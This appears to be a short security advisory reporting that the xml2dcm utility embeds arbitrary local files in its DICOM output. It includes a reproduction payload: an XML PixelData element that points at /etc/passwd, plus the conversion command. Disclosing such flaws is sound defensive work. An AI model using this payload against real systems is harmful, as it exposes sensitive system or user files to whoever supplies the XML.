# Insecure functionality in xml2dcm utility

xml2dcm utility allows to read local files, which may contain sensitive data such as passwords or private user data. 

## Steps to reproduce:
1) Create xml with payload:
```
<element tag="7fe0,0010" vr="OW" vm="1"  name="PixelData" loaded="no" binary="file">/etc/passwd</element>
```
2) Convert xml to dcm using the xml2dcm:
$ xml2dcm test.xml out.dcm
3) The result DICOM-file will include the content of `/etc/passwd` file.

## Information
`xml2dcm` doesn't have any parameters to disable this functionality.
The vendor doesn't consider this a vulnerability.